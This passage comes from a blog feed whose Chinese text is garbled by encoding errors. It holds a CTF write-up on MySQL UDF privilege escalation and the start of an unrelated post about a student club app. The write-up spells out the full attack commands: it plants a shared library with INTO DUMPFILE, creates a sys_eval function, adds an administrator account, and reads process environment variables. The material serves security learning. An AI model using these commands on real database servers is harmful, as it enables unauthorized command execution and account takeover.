åæ”¾å…¥pluginç›®å½•ä¸‹çš„mysqludf.soï¼Œå¦‚æœpluginæ–‡ä»¶å¤¹ä¸‹ä¸å­˜åœ¨mysqludf.soæ–‡ä»¶ï¼Œåˆ™ä¼šè‡ªåŠ¨ç”Ÿæˆ<br>select unhex(&#x27;xxx&#x27;) into dumpfile &#x27;/usr/local/Cellar/mysql/5.7.22/lib/plugin/mysqludf.so&#x27;;<br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤"><a href="#åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤" class="headerlink" title="åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤:"></a>åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt; <br>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>å¯¼å…¥æˆåŠŸåæŸ¥çœ‹ä¸€ä¸‹ mysql å‡½æ•°é‡Œé¢æ˜¯å¦æ–°å¢äº† sys_evalï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt; <br>select * from mysql.func;<br></code></pre></td></tr></table></figure><p>æ­£ç¡®çš„å›æ˜¾:</p><p><img src="/images/2024-2-3-only_sql/image-20240202164845159.png" alt="image-20240202164845159"></p><p>å¦‚æœä¸æˆåŠŸçš„è¯,æ˜¯å› ä¸ºdllç‰ˆæœ¬ä¸ç¬¦ã€‚</p><h4 id="é€šè¿‡åˆ›å»ºçš„è¿™ä¸ªå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼š"><a href="#é€šè¿‡åˆ›å»ºçš„è¿™ä¸ªå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼š" class="headerlink" title="é€šè¿‡åˆ›å»ºçš„è¿™ä¸ªå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼š"></a>é€šè¿‡åˆ›å»ºçš„è¿™ä¸ªå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼š</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt; <br>select sys_eval(&#x27;whoami&#x27;);<br></code></pre></td></tr></table></figure><p>å¦‚æœåœ¨ Windows ç³»ç»Ÿä¸‹çš„è¯åº”è¯¥å°±æ˜¯æœ€é«˜æƒé™äº†ï¼Œæ‰§è¡Œä¸€äº› net user å¢åŠ ç”¨æˆ·çš„å‘½ä»¤åº”è¯¥éƒ½æ˜¯å¯ä»¥æˆåŠŸçš„:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">SELECT sys_eval(<br>&#x27;net user ocean1 ocean1 /add &amp; net localgroup administrators ocean1 /add&#x27;<br>)<br></code></pre></td></tr></table></figure><h3 id="ä¸Šä¼ udfåº“æ–‡ä»¶"><a href="#ä¸Šä¼ udfåº“æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ udfåº“æ–‡ä»¶:"></a>ä¸Šä¼ udfåº“æ–‡ä»¶:</h3><h4 id="è·å–pluginè·¯å¾„"><a href="#è·å–pluginè·¯å¾„" class="headerlink" title="è·å–pluginè·¯å¾„:"></a>è·å–pluginè·¯å¾„:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt; <br>show variables like &quot;%plugin%&quot;;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202173358044.png" alt="image-20240202173358044"></p><h4 id="è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯"><a href="#è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯:"></a>è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt; <br>show variables like &#x27;version_compile_%&#x27;;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202181215556.png" alt="image-20240202181215556"></p><h4 id="å‡†å¤‡udfåº“æ–‡ä»¶-åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶"><a href="#å‡†å¤‡udfåº“æ–‡ä»¶-åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶" class="headerlink" title="å‡†å¤‡udfåº“æ–‡ä»¶(åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶):"></a>å‡†å¤‡udfåº“æ–‡ä»¶(åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶):</h4><p>å¸¸ç”¨çš„å·¥å…· <a href="https://so.csdn.net/so/search?q=sqlmap&spm=1001.2101.3001.7020">sqlmap</a> å’Œ Metasploit é‡Œé¢éƒ½è‡ªå¸¦äº†å¯¹åº”ç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥æ‰¾</p><h5 id="sqlmap-çš„-UDF-åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®"><a href="#sqlmap-çš„-UDF-åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®" class="headerlink" title="sqlmap çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®:"></a>sqlmap çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">sqlmapä¸­æœ‰ç°æˆçš„udfæ–‡ä»¶ã€‚åˆ†åˆ«æ˜¯32ä½å’Œ64ä½çš„ã€‚è¿™é‡Œé€‰æ‹©<br>sqlmapæ ¹ç›®å½•/data/udf/mysql<br>sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ã€‚<br><br># kaliçš„sqlmapåœ¨/usr/share/sqlmapç›®å½•<br></code></pre></td></tr></table></figure><p>æœ‰32ä½å’Œ64ä½ä¹‹åˆ†ï¼Œè¿™ä¸ªdllå¹¶ä¸æ˜¯è·Ÿç³»ç»Ÿä½æ•°æœ‰å…³çš„ï¼Œè€Œæ˜¯è·Ÿmysqlç‰ˆæœ¬æœ‰å…³ç³»</p><p><strong>è¦æ³¨æ„çš„æ˜¯Sqlmapä¸­è‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä¸ºäº†é˜²æ­¢è¢«è¯¯æ€éƒ½ç»è¿‡ç¼–ç å¤„ç†è¿‡ï¼Œä¸èƒ½è¢«ç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦ä½¿ç”¨ sqlmap è‡ªå¸¦çš„è§£ç å·¥å…·cloak.py æ¥è§£ç ä½¿ç”¨:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt"># è„šæœ¬ä½ç½®<br>/usr/share/sqlmap/extra/cloak/<br># æ‰§è¡Œ<br>python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_<br># è¿›è¡Œdll_æ–‡ä»¶çš„è§£ç ï¼Œè·å¾—dllæ–‡ä»¶<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ä¼šåœ¨ç›¸åŒç›®å½•ç”Ÿæˆè§£å¯†åçš„lib_mysqludf_sys.soã€‚</p><h4 id="Metasploit-çš„-UDF-åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®"><a href="#Metasploit-çš„-UDF-åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®" class="headerlink" title="Metasploit çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®:"></a>Metasploit çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">usr/share/metasploit-framework/data/exploits/mysql<br># kaliè‡ªå¸¦çš„msf<br><br>åœ¨kaliçš„/usr/share/metasploit-framework/data/exploits/mysqlç›®å½•ä¸‹æ‰¾åˆ°ç›¸åº”çš„åº“å³å¯ã€‚<br><br>è¿™ä¸ªåº“å’Œsqlmapè§£å¯†åçš„ä¸€æ¨¡ä¸€æ ·ã€‚<br></code></pre></td></tr></table></figure><h4 id="è·å–åº“æ–‡ä»¶çš„16è¿›åˆ¶"><a href="#è·å–åº“æ–‡ä»¶çš„16è¿›åˆ¶" class="headerlink" title="è·å–åº“æ–‡ä»¶çš„16è¿›åˆ¶:"></a>è·å–åº“æ–‡ä»¶çš„16è¿›åˆ¶:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select hex(load_file(&#x27;/security/ctf/tools_bar/4_æ³¨å…¥æ”»å‡»/SQLI/sqlmap-dev/data/udf/mysql/linux/64/lib_mysqludf_sys.so&#x27;)) into outfile &#x27;/tmp/udf.txt&#x27;;<br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºå‡½æ•°"><a href="#åˆ›å»ºå‡½æ•°" class="headerlink" title="åˆ›å»ºå‡½æ•°:"></a>åˆ›å»ºå‡½æ•°:</h4><p>å…ˆåœ¨<strong>æœ¬åœ°</strong>æŸ¥çœ‹æœ‰å“ªäº›å‡½æ•°å¯ç”¨:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">nm -D lib_mysqludf_sys.so<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs txt">                 w _Jv_RegisterClasses<br>0000000000201788 A __bss_start<br>                 w __cxa_finalize<br>                 w __gmon_start__<br>0000000000201788 A _edata<br>0000000000201798 A _end<br>0000000000001178 T _fini<br>0000000000000ba0 T _init<br>                 U fgets<br>                 U fork<br>                 U free<br>                 U getenv<br>000000000000101a T lib_mysqludf_sys_info<br>0000000000000da4 T lib_mysqludf_sys_info_deinit<br>0000000000001047 T lib_mysqludf_sys_info_init<br>                 U malloc<br>                 U mmap<br>                 U pclose<br>                 U popen<br>                 U realloc<br>                 U setenv<br>                 U strcpy<br>                 U strncpy<br>0000000000000dac T sys_bineval<br>0000000000000dab T sys_bineval_deinit<br>0000000000000da8 T sys_bineval_init<br>0000000000000e46 T sys_eval<br>0000000000000da7 T sys_eval_deinit<br>0000000000000f2e T sys_eval_init<br>0000000000001066 T sys_exec<br>0000000000000da6 T sys_exec_deinit<br>0000000000000f57 T sys_exec_init<br>00000000000010f7 T sys_get<br>0000000000000da5 T sys_get_deinit<br>0000000000000fea T sys_get_init<br>000000000000107a T sys_set<br>00000000000010e8 T sys_set_deinit<br>0000000000000f80 T sys_set_init<br>                 U sysconf<br>                 U system<br>                 U waitpid<br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºsys-evalå‡½æ•°"><a href="#åˆ›å»ºsys-evalå‡½æ•°" class="headerlink" title="åˆ›å»ºsys_evalå‡½æ•°:"></a>åˆ›å»º<code>sys_eval</code>å‡½æ•°:</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">create function sys_eval returns string soname &quot;mysqludf.so&quot;;<br></code></pre></td></tr></table></figure><h3 id="åˆ é™¤è‡ªå®šä¹‰å‡½æ•°"><a href="#åˆ é™¤è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="åˆ é™¤è‡ªå®šä¹‰å‡½æ•°:"></a>åˆ é™¤è‡ªå®šä¹‰å‡½æ•°:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt; <br>drop function sys_eval;<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a>æ€»ç»“:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¸¸è§„SQLMAPçš„--OS-SHELLæµç¨‹å¤§è‡´ä¸ºï¼šåˆ©ç”¨SELECT â€¦ INTO OUTFILE â€¦ LINES TERMINATED BYä¸Šä¼ å°é©¬ï¼ˆä»…ä¸Šä¼ åŠŸèƒ½ï¼‰ -&gt; åˆ©ç”¨å°é©¬ä¸Šä¼ Webshellï¼ˆå¯ä½¿ç”¨systemã€proc_openã€shell_execã€passthruã€popenã€execæ‰§è¡Œå‘½ä»¤ï¼‰ -&gt; åˆ©ç”¨Webshellæ‰§è¡Œå‘½ä»¤ï¼ˆæ˜æ–‡å‚æ•°cmd=whoamiï¼‰<br>ç°åœ¨å¤§å¤šæ•°Mysqlç‰ˆæœ¬éƒ½å¤§äº5.1ï¼Œç‰ˆæœ¬å¤§äº5.1åå¯¹äºææƒçš„æ¡ä»¶å¾ˆè‹›åˆ»ï¼Œæ‰€ä»¥å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ²¡åŠæ³•ä½¿ç”¨udfè¿›è¡Œä¸€ä¸ªææƒ<br></code></pre></td></tr></table></figure><h2 id="only-sqlé¢˜ç›®å¤ç°"><a href="#only-sqlé¢˜ç›®å¤ç°" class="headerlink" title="only_sqlé¢˜ç›®å¤ç°:"></a>only_sqlé¢˜ç›®å¤ç°:</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨å¦‚ä¸‹çš„-SQL-è¯­å¥æ¥æŸ¥è¯¢MySQLçš„æ’ä»¶ç›®å½•"><a href="#ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨å¦‚ä¸‹çš„-SQL-è¯­å¥æ¥æŸ¥è¯¢MySQLçš„æ’ä»¶ç›®å½•" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨å¦‚ä¸‹çš„ SQL è¯­å¥æ¥æŸ¥è¯¢MySQLçš„æ’ä»¶ç›®å½•:"></a>ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨å¦‚ä¸‹çš„ SQL è¯­å¥æ¥æŸ¥è¯¢MySQLçš„æ’ä»¶ç›®å½•:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt;<br>show variables like &#x27;%plugin%&#x27;;<br></code></pre></td></tr></table></figure><h4 id="plugin-ç›®å½•è¢«æ”¹äº†"><a href="#plugin-ç›®å½•è¢«æ”¹äº†" class="headerlink" title="plugin ç›®å½•è¢«æ”¹äº†:"></a>plugin ç›®å½•è¢«æ”¹äº†:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/var/lib/mysql/p1ugin<br></code></pre></td></tr></table></figure><h3 id="ç¬¬äºŒæ­¥ï¼šå†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š"><a href="#ç¬¬äºŒæ­¥ï¼šå†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šå†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š"></a>ç¬¬äºŒæ­¥ï¼šå†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">select unhex(&#x27;xxx&#x27;) into dumpfile &#x27;/usr/lib/mysql/p1ugin/hacker.so&#x27;;<br>//xxxä¸ºä¸Šè¿°ä¸­/tmp/udf.txtæ–‡ä»¶å¤¹ä¸‹çš„16è¿›åˆ¶åŠ å¯†å†…å®¹ï¼Œè¿™é‡Œå–åä¸Šä¼ çš„é…ç½®æ–‡ä»¶ä¸ºhacker.so<br></code></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºä¸€ä¸ªå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°"><a href="#ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºä¸€ä¸ªå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºä¸€ä¸ªå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°:"></a>ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºä¸€ä¸ªå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">//ä½¿ç”¨ä¸Šä¼ çš„hacker.soåˆ›å»ºä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°<br>create function sys_eval returns string soname &#x27;hacker.so&#x27;;<br></code></pre></td></tr></table></figure><h3 id="ç¬¬å››æ­¥ï¼šRCEï¼š"><a href="#ç¬¬å››æ­¥ï¼šRCEï¼š" class="headerlink" title="ç¬¬å››æ­¥ï¼šRCEï¼š"></a>ç¬¬å››æ­¥ï¼šRCEï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql&gt;<br>select sys_eval(&#x27;cat /proc/self/environ&#x27;;)<br></code></pre></td></tr></table></figure><p>è·å–flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„(Demo)åˆæˆæœæ¼”ç¤º</title>
    <link href="/2023/12/04/2023-12-4-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E9%87%8C%E7%A8%8B%E7%A2%913/"/>
    <url>/2023/12/04/2023-12-4-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E9%87%8C%E7%A8%8B%E7%A2%913/</url>
    
    <content type="html"><![CDATA[<h1 id="è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„-Demo-åˆæˆæœæ¼”ç¤º"><a href="#è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„-Demo-åˆæˆæœæ¼”ç¤º" class="headerlink" title="è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„(Demo)åˆæˆæœæ¼”ç¤º"></a>è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„(Demo)åˆæˆæœæ¼”ç¤º</h1><h2 id="åˆ†å·¥"><a href="#åˆ†å·¥" class="headerlink" title="åˆ†å·¥:"></a>åˆ†å·¥:</h2><p>é«˜é“®ç”·:ç½‘é¡µç«¯åˆ¶ä½œ</p><p>èƒ¡çºªç¦:APPç«¯åˆ¶ä½œ</p><p>é™ˆå¸…:ç½‘é¡µç«¯åˆ¶ä½œ</p><p>éŸ©æ±ä»£:ç±»å›¾ï¼Œç”¨ä¾‹å›¾</p><p>å‘¨è¯—ä¹”:æ•°æ®æµå›¾</p><p>ç«ºæŸ¯æ°:é¡ºåºå›¾</p><h2 id="iClubé¡¹ç›®èƒŒæ™¯åŠç®€ä»‹"><a href="#iClubé¡¹ç›®èƒŒæ™¯åŠç®€ä»‹" class="headerlink" title="iClubé¡¹ç›®èƒŒæ™¯åŠç®€ä»‹"></a>iClubé¡¹ç›®èƒŒæ™¯åŠç®€ä»‹</h2><p>å¤§å­¦é‡Œæœ‰å„ç§å„æ ·çš„ç¤¾å›¢ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªé›†ä¸­çš„å¹³å°ç»¼åˆç®¡ç†è¿™äº›ç¤¾å›¢ä¿¡æ¯ï¼Œå› æ­¤å­¦ç”Ÿä¹Ÿå¾ˆéš¾å…¨é¢äº†è§£åˆ°å­¦æ ¡çš„ç¤¾å›¢ä»¥åŠç¤¾å›¢æ´»åŠ¨ã€‚å› æ­¤æœ¬é¡¹ç›®é¢å‘å¯¹è±¡ä¸ºå¤§å­¦å…¨ä½“å­¦ç”Ÿï¼Œå®ç°æ ¡å›­ç¤¾å›¢ç®¡ç†åŠŸèƒ½ï¼Œä¾‹å¦‚æ£€ç´¢æ ¡å†…æ‰€æœ‰ç¤¾å›¢ã€ç”³è¯·åŠ å…¥ï¼Œå‚åŠ ç¤¾å›¢æ´»åŠ¨ç­‰ã€‚</p><h2 id="éœ€æ±‚åˆ†æ"><a href="#éœ€æ±‚åˆ†æ" class="headerlink" title="éœ€æ±‚åˆ†æ:"></a>éœ€æ±‚åˆ†æ:</h2><h3 id="éç¤¾é•¿å­¦ç”Ÿ"><a href="#éç¤¾é•¿å­¦ç”Ÿ" class="headerlink" title="éç¤¾é•¿å­¦ç”Ÿ"></a>éç¤¾é•¿å­¦ç”Ÿ</h3><p>1.æ ¡å†…æ‰€æœ‰å­¦ç”Ÿè´¦å·å¯†ç å·²æ ¹æ®å­¦å·åˆå§‹åŒ–ï¼Œæ— éœ€æ³¨å†Œï¼Œç›´æ¥ç™»å½•ã€‚</p><p>2.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥ä¿®æ”¹è‡ªå·±çš„åŸºæœ¬ä¿¡æ¯ï¼ˆå¯†ç ã€æ˜µç§°ã€æ‰‹æœºå·ã€å¤´åƒç­‰ç­‰ä¿¡æ¯ï¼‰ã€‚</p><p>3.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥æŸ¥è¯¢æ‰€æœ‰ç¤¾å›¢çš„åŸºæœ¬ä¿¡æ¯ã€å·²ç»åŠ å…¥çš„ç¤¾å›¢ã€‚</p><p>4.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥å¡«å†™ç¤¾å›¢ç”³è¯·è¡¨ï¼Œç¤¾é•¿å®¡æ ¸é€šè¿‡åå¯æˆä¸ºç¤¾å‘˜ã€‚</p><p>5.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥æŸ¥è¯¢æ‰€æœ‰ç¤¾å›¢å‘å¸ƒçš„æ´»åŠ¨ã€å·²ç»æŠ¥åçš„æ´»åŠ¨ï¼ŒæŠ¥åç¬¦åˆæ¡ä»¶çš„æ´»åŠ¨ã€‚</p><p>6.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥æ¥æ”¶ç›¸å…³æ´»åŠ¨ã€ç¤¾å›¢çš„é€šçŸ¥ã€‚</p><p>7.éç¤¾é•¿å­¦ç”Ÿå¯ä»¥åœ¨ç•™è¨€æ¿ç•™è¨€å¹¶æŸ¥çœ‹ç•™è¨€æ¿æ‰€æœ‰å†…å®¹ã€æˆ‘çš„ç•™è¨€ä»¥åŠè¯„è®ºã€‚</p><h3 id="ç¤¾é•¿å­¦ç”Ÿ"><a href="#ç¤¾é•¿å­¦ç”Ÿ" class="headerlink" title="ç¤¾é•¿å­¦ç”Ÿ"></a>ç¤¾é•¿å­¦ç”Ÿ</h3><p>1.ç¤¾é•¿å­¦ç”Ÿæ˜¯ç‰¹æ®Šçš„æ™®é€šå­¦ç”Ÿï¼Œæ‹¥æœ‰æ™®é€šå­¦ç”Ÿçš„æ‰€æœ‰åŠŸèƒ½ã€‚</p><p>2.ç¤¾å›¢ã€ç¤¾é•¿ä¿¡æ¯ç”±åå°ç®¡ç†å‘˜ç®¡ç†ã€‚</p><p>3.ç¤¾é•¿å¯ä»¥ä¿®æ”¹æœ¬ç¤¾å›¢åŸºæœ¬ä¿¡æ¯ï¼ˆåç§°ã€Logoã€ç¤¾å›¢ç®€ä»‹ç­‰ï¼‰ã€‚</p><p>4.ç¤¾é•¿å¯ä»¥ç®¡ç†æœ¬ç¤¾å›¢æ´»åŠ¨ï¼ˆå‘å¸ƒæ´»åŠ¨ã€ä¿®æ”¹æ´»åŠ¨ä¿¡æ¯ã€åˆ é™¤æ´»åŠ¨ï¼‰ã€‚</p><p>5.ç¤¾é•¿å¯ä»¥ç®¡ç†æœ¬ç¤¾å›¢ç¤¾å‘˜ï¼ˆå®¡æ ¸å…¥ç¤¾ç”³è¯·ã€åˆ é™¤ç¤¾å‘˜ã€æŸ¥çœ‹ç¤¾å‘˜ä¿¡æ¯ï¼‰ã€‚</p><p>6.ç¤¾é•¿å¯ä»¥ç®¡ç†æœ¬ç¤¾å›¢é€šçŸ¥ï¼ˆå‘å¸ƒé€šçŸ¥ï¼Œåˆ é™¤é€šçŸ¥ï¼‰ã€‚</p><p>7.ç¤¾é•¿å¯ä»¥å°†ç¤¾é•¿èŒä½è½¬è®©ç»™æŸç¤¾å‘˜ã€‚</p><h3 id="åå°ç®¡ç†å‘˜"><a href="#åå°ç®¡ç†å‘˜" class="headerlink" title="åå°ç®¡ç†å‘˜"></a>åå°ç®¡ç†å‘˜</h3><ol><li>åå°ç®¡ç†å‘˜è¿›è¡Œå­¦ç”Ÿã€ç¤¾å›¢çš„å¢ã€åˆ ã€‚</li><li>åå°ç®¡ç†å‘˜å®¡æ‰¹ç¤¾é•¿å‘å¸ƒçš„æ´»åŠ¨æ˜¯å¦é€šè¿‡ã€‚</li><li>åå°ç®¡ç†å‘˜å¯ä»¥ä¿®æ”¹ç¤¾é•¿ã€ç¤¾å›¢ä¿¡æ¯ï¼ˆå¯¹æ•°æ®åº“è¿›è¡Œç›´æ¥æ“ä½œï¼‰ã€‚</li></ol><h2 id="ç”¨ä¾‹å›¾"><a href="#ç”¨ä¾‹å›¾" class="headerlink" title="ç”¨ä¾‹å›¾:"></a>ç”¨ä¾‹å›¾:</h2><p>æ ¹æ®è½¯ä»¶éœ€æ±‚å’ŒåŸå‹å›¾åˆ¶ä½œç»˜åˆ¶äº†ä»¥ä¸‹ç”¨ä¾‹å›¾ï¼ˆä¸ºäº†æ›´åŠ æ¸…æ™°å±•ç¤ºå°†è½¯ä»¶çš„ä¸‰ä¸ªä¸»ä½“åŠŸèƒ½åˆ†ä¸ºä¸‰ä¸ªç³»ç»Ÿç»˜åˆ¶ï¼‰ï¼š</p><p><img src="/images/2023_12_4_third_milestone/%E7%94%A8%E4%BE%8B%E5%9B%BE%EF%BC%88%E6%8B%BC%E6%8E%A5%EF%BC%89.jpg" alt="ç”¨ä¾‹å›¾ï¼ˆæ‹¼æ¥ï¼‰"></p><h2 id="ç±»å›¾"><a href="#ç±»å›¾" class="headerlink" title="ç±»å›¾:"></a>ç±»å›¾:</h2><p><img src="/images/2023_12_4_third_milestone/%E7%B1%BB%E5%9B%BE.png" alt="ç±»å›¾"></p><h2 id="æ•°æ®æµå›¾"><a href="#æ•°æ®æµå›¾" class="headerlink" title="æ•°æ®æµå›¾:"></a>æ•°æ®æµå›¾:</h2><p><img src="/images/2023_12_4_third_milestone/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png" alt="æ•°æ®æµå›¾"></p><h2 id="é¡ºåºå›¾"><a href="#é¡ºåºå›¾" class="headerlink" title="é¡ºåºå›¾:"></a>é¡ºåºå›¾:</h2><h3 id="æŠ¥åæ´»åŠ¨"><a href="#æŠ¥åæ´»åŠ¨" class="headerlink" title="æŠ¥åæ´»åŠ¨:"></a>æŠ¥åæ´»åŠ¨:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%8A%A5%E5%90%8D%E6%B4%BB%E5%8A%A8.png" alt="é¡ºåºå›¾_æŠ¥åæ´»åŠ¨"></p><h3 